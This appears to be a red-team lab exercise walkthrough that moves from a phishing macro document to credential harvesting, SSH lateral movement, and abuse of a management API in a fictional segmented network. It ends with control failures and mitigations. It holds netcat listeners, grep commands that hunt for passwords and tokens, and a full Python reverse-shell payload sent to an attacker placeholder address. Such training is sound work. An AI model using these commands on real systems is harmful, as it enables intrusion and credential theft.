# Operation Broken Trust

Objective: Simulate a sophisticated adversary leveraging trusted internal relationships and application weaknesses to move laterally through a segmented lab network, culminating in the compromise of a secured management server.

Scenario: The [MycoSec](entity.md) internal lab network is segmented into trust zones, including a development virtual local area network and a secured management virtual local area network. Development servers possess trusted relationships with management systems for deployment tasks. The goal is to pivot from a low-value development server to a high-value management server.

## Phase 1: Initial Compromise Via Weaponised Document

Goal: Gain initial code execution on a developer workstation by exploiting a malicious document.

Instructions:

1.  Deploy The Phishing Lure:
    *   An attacker-controlled server hosts a weaponised macro-enabled document named `Q2_Research_Objectives.docm`.
    *   The document is distributed via a targeted phishing email to a MycoSec developer.

2.  Trigger The Payload:
    *   The developer enables macros, executing the embedded code.
    *   The macro establishes a reverse Hypertext Transfer Protocol Secure shell to the attacker's command and control server.

3.  Establish Foothold:
    *   On the attacker virtual machine, receive the incoming shell connection.
    *   Command: `sudo nc -nvlp 443`
    *   Verification: A command prompt from the developer workstation is received.
    *   Workstation Hostname: `[Discover This]`

Checkpoint: Initial access is achieved on a domain-joined Linux workstation.

## Phase 2: Local Reconnaissance And Credential Discovery

Goal: Discover credentials, keys, or configuration files that grant access to other internal systems.

Instructions:

1.  Examine User History And Files:
    *   Search the user's home directory for files containing passwords or keys.
    *   Command: `grep -r -i "password\|passwd\|key" ~/ 2>/dev/null`
    *   Finding: A file `.env` contains a plaintext password for a service account.
    *   Service Account Password: `[Discover This]`

2.  Inspect Running Processes And Network Connections:
    *   Look for connected systems or authentication tokens.
    *   Command: `netstat -antp | grep ESTABLISHED`
    *   Finding: An established connection is observed to an internal server on port 22. Note the Internet Protocol address.
    *   Internal Server Internet Protocol: `[Discover This]` (Note as `DEV_SERVER`)

3.  Check For Secure Shell Trust Relationships:
    *   Look for authorised keys or known hosts.
    *   Command: `cat ~/.ssh/authorized_keys` and `cat ~/.ssh/known_hosts`
    *   Finding: The `known_hosts` file contains the fingerprint of the `DEV_SERVER`.

Checkpoint: Credentials and a potential lateral movement target are identified.

## Phase 3: Lateral Movement To Development Server

Goal: Use discovered credentials to authenticate to and compromise an internal development server.

Instructions:

1.  Test Credentials On Target Service:
    *   Attempt to authenticate to the `DEV_SERVER` using the discovered service account password via Secure Shell.
    *   Command: `ssh service_account@DEV_SERVER`
    *   Password: `[Service Account Password]`
    *   Verification: Secure Shell access is granted to the development server.

2.  Enumerate Server Role And Function:
    *   Determine the purpose of this server and its privileges.
    *   Command: `sudo -l` and `find / -name ".git" -type d 2>/dev/null`
    *   Finding: The server hosts a Git repository for an internal administration tool. The user can run a specific Python script as root.

Checkpoint: Access is achieved to a more privileged development server hosting source code.

## Phase 4: Exploitation Of Build Mechanism

Goal: Exploit the server's function to gain privileged credentials for the management zone.

Instructions:

1.  Review The Administration Tool Code:
    *   Inspect the Git repository to understand the tool's function.
    *   Command: `cd /opt/management_tool && git log --oneline`
    *   Finding: The tool contains a hardcoded credential for authenticating to the management application programming interface.

2.  Extract Hardcoded Credentials:
    *   Search the source code for keywords related to authentication.
    *   Command: `grep -r -i "token\|api_key\|auth" /opt/management_tool/ 2>/dev/null`
    *   Finding: A file `config.py` contains an application programming interface uniform resource identifier and a token.
    *   Management Application Programming Interface Token: `[Discover This]`

3.  Identify The Management Server:
    *   From the configuration file, note the address of the management application programming interface.
    *   Management Application Programming Interface Host: `[Discover This]` (Note as `MGMT_SERVER`)

Checkpoint: Credentials for the management network are discovered within the application's source code.

## Phase 5: Compromise Of Management Server

Goal: Use the extracted application programming interface token to access the management server and achieve full compromise.

Instructions:

1.  Query The Management Application Programming Interface:
    *   From the development server, query the management application programming interface to test the token.
    *   Command: `curl -H "Authorization: Bearer [API_TOKEN]" https://MGMT_SERVER/api/v1/systems/`
    *   Finding: The command returns a list of all systems managed by the platform.

2.  Exploit Application Programming Interface Functionality:
    *   The application programming interface has a command execution endpoint for remote administration.
    *   Command: `curl -X POST -H "Authorization: Bearer [API_TOKEN]" -H "Content-Type: application/json" -d '{"command": "whoami"}' https://MGMT_SERVER/api/v1/command/`
    *   Verification: The command executes successfully and returns `root`.

3.  Establish A Reverse Shell:
    *   Use the application programming interface to launch a reverse shell payload back to the attacker machine.
    *   Command: `curl -X POST -H "Authorization: Bearer [API_TOKEN]" -H "Content-Type: application/json" -d '{"command": "python3 -c \\"import os, socket, subprocess; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\"[ATTACKER_IP]\\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\\"/bin/sh\\",\\"-i\\"]);\\""}' https://MGMT_SERVER/api/v1/command/`

4.  Receive The Shell:
    *   On the attacker virtual machine, receive the root shell connection from the management server.
    *   Command: `sudo nc -nvlp 4444`
    *   Verification: A root shell on the management server is received.
    *   Final Hostname: `[Discover This]`

Final Report: Document all the `[Discover This]` fields. Analyse the critical control failures:
1.  Insufficient User Training: A user enabled macros on an untrusted document.
2.  Hardcoded Credentials: Plaintext passwords and application programming interface tokens were stored within source code and configuration files.
3.  Excessive Privileges: A service account used for development had unnecessary access to a production management application programming interface.
4.  Weak Application Programming Interface Security: The management application programming interface did not sufficiently validate commands or implement network-level access controls.

Proposed Mitigations:
1.  Implement Application Allow Listing: Prevent the execution of unauthorised macros and software.
2.  Utilise A Secrets Management Solution: Replace all hardcoded credentials with dynamically injected secrets from a secure vault.
3.  Enforce Strict Network Segmentation: Ensure that development systems cannot initiate connections to management systems without explicit justification and proxy-based inspection.
4.  Harden Application Programming Interfaces: Implement strict input validation and require multi-factor authentication for privileged application programming interface endpoints.
